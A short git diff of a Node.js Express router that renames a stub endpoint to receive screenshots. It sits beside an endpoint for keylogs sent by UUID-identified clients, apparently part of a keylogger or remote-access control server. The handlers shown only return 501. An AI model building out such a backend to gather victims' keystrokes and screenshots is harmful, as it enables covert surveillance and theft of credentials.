@@ -21,7 +21,7 @@ router.post('/:uuid/keylogs', (req, res) => {
 })
 
 //At clients sending screenshots
-router.post('/:uuid/commands', (req, res) => {
+router.post('/:uuid/screenshots', (req, res) => {
     res.status(501).json({})
 })
 module.exports = router
